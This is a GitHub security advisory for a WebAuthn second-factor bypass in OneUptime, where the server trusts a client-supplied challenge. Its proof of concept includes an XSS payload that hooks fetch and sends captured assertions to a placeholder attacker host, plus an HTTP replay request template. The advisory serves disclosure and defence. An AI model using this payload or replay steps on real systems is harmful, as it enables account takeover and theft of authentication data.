# [H] OneUptime has WebAuthn 2FA bypass: server accepts client-supplied challenge instead of server-stored value, allowing credential replay

## Summary
Severity: High
Advisory: GHSA-gjjc-pcwp-c74m
CVE: CVE-2026-28787
CWE: CWE-287, CWE-294
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:N (CVSS_V3)
Published: 2026-03-02
Source: https://github.com/advisories/GHSA-gjjc-pcwp-c74m
Type: github-advisory

## Affected
- npm: `@oneuptime/common` — affected >=0

## Details
### Summary

The WebAuthn authentication implementation does not store the challenge on the server side. Instead, the challenge is returned to the client and accepted back from the client request body during verification. This violates the WebAuthn specification ([W3C Web Authentication Level 2, §13.4.3](https://www.w3.org/TR/webauthn-2/#sctn-cryptographic-challenges)) and allows an attacker who has obtained a valid WebAuthn assertion (e.g., via XSS, MitM, or log exposure) to replay it indefinitely, completely bypassing the second-factor authentication.

### Details

During WebAuthn authentication, the server generates a random challenge via `generateAuthenticationOptions()` in `Common/Server/Services/UserWebAuthnService.ts` (line 164-221). However, the challenge is **only returned to the client** and **never stored in a session or database** on the server side.

When the client submits the authentication response, the server reads the `expectedChallenge` directly from the untrusted request body (`Authentication.ts:1042`):

```typescript
// App/FeatureSet/Identity/API/Authentication.ts:1041-1049
} else if (verifyWebAuthn) {
  const expectedChallenge: string = data["challenge"] as string;  // ← client-controlled
  const credential: any = data["credential"];

  await UserWebAuthnService.verifyAuthentication({
    userId: alreadySavedUser.id!.toString(),
    challenge: expectedChallenge,  // ← NOT a server-stored value
    credential: credential,
  });
}
```

The `verifyAuthentication()` method then passes this client-provided challenge to `@simplewebauthn/server`'s `verifyAuthenticationResponse()` as `expectedChallenge` (`UserWebAuthnService.ts:268-270`):

```typescript
const verification: any = await verifyAuthenticationResponse({
  response: data.credential,
  expectedChallenge: data.challenge,  // ← client-controlled value used as "expected"
  expectedOrigin: expectedOrigin,
  expectedRPID: Host.toString(),
  credential: { /* public key from DB */ },
});
```

Since both the `expectedChallenge` (from request body) and the challenge embedded in the credential's `clientDataJSON` originate from the same captured assertion, they will always match. The cryptographic signature also remains valid because it was signed by the legitimate user's authenticator.

**Correct flow vs. OneUptime's flow:**

| Step | Correct WebAuthn | OneUptime |
|------|-----------------|-----------|
| 1. Generate challenge | Server generates random challenge | Same |
| 2. Store challenge | **Saved in session/DB** | **Not saved anywhere** |
| 3. Send to client | Sent to client | Same |
| 4. Authenticator signs | Authenticator signs challenge | Same |
| 5. Client returns | Returns signed credential | Returns credential **+ challenge** |
| 6. Verify | Compares against **server-stored** value | Compares against **client-provided** value |
| Result | Replay-proof | **Replayable** |

### PoC

**Prerequisites:**
- An attacker has obtained the victim's password (e.g., credential stuffing, phishing)
- An attacker has captured a valid WebAuthn assertion from the victim (e.g., via XSS on a OneUptime page, network interception, or log leakage)

**Steps to reproduce:**

1. **Capture a valid WebAuthn assertion.**
   Intercept or extract a legitimate authentication request containing `challenge` and `credential` fields. For example, by injecting JavaScript via stored XSS in a Mermaid diagram on a status page (related vulnerability):

   ```javascript
   // XSS payload to intercept WebAuthn authentication
   const origFetch = window.fetch;
   window.fetch = async function(url, opts) {
     if (url.includes('/verify') && opts?.body) {
       const body = JSON.parse(opts.body);
       if (body.data?.credential) {
         // Exfiltrate the assertion
         navigator.sendBeacon('https://attacker.example/collect', JSON.stringify({
           challenge: body.data.challenge,
           credential: body.data.credential
         }));
       }
     }
     return origFetch.apply(this, arguments);
   };
   ```

2. **Replay the captured assertion at any later time.**
   Send the following request with the victim's email, password, and the captured challenge + credential:

   ```http
   POST /api/identity/authentication/login HTTP/1.1
   Content-Type: application/json

   {
     "data": {
       "email": "victim@example.com",
       "password": "<victim's password>",
       "challenge": "<captured challenge value>",
       "credential": {
         "id": "<captured credential id>",
         "rawId": "<captured rawId>",
         "response": {
           "authenticatorData": "<captured authenticatorData>",
           "clientDataJSON": "<captured clientDataJSON>",
           "signature": "<captured signature>"
         },
         "type": "public-key",
         "clientExtensionResults": {},
         "authenticatorAttachment": "platform"
       }
     }
   }
   ```

3. **Result:** The server accepts the authentication. The `expectedChallenge` (from the request body) matches the challenge in `clientDataJSON` (from the same captured assertion), and the signature is valid (signed by the real user's key). A session token is returned, granting full access to the victim's account.

   The attacker bypasses WebAuthn 2FA without possessing the victim's authenticator device.

### Impact

**WebAuthn 2FA is rendered ineffective.** The entire purpose of WebAuthn as a second factor is to protect accounts when passwords are compromised. This vulnerability means that once an attacker has both the password and a single captured assertion, they can authenticate as the victim indefinitely — the assertion never expires because there is no server-side challenge state to invalidate.

**Who is impacted:** Any OneUptime user who has enrolled WebAuthn/Passkey as their second factor. The 2FA protection they rely on provides no meaningful security against an attacker who has obtained their password and intercepted one authentication exchange.

**Attack chain potential:** This vulnerability can be chained with:
- Stored XSS (e.g., via Mermaid rendering in status pages) to capture assertions
- Absence of rate limiting on authentication endpoints to obtain passwords via credential stuffing
- User enumeration via differential error messages to identify valid targets

## References
- https://github.com/OneUptime/oneuptime/security/advisories/GHSA-gjjc-pcwp-c74m
- https://nvd.nist.gov/vuln/detail/CVE-2026-28787
- https://github.com/OneUptime/oneuptime
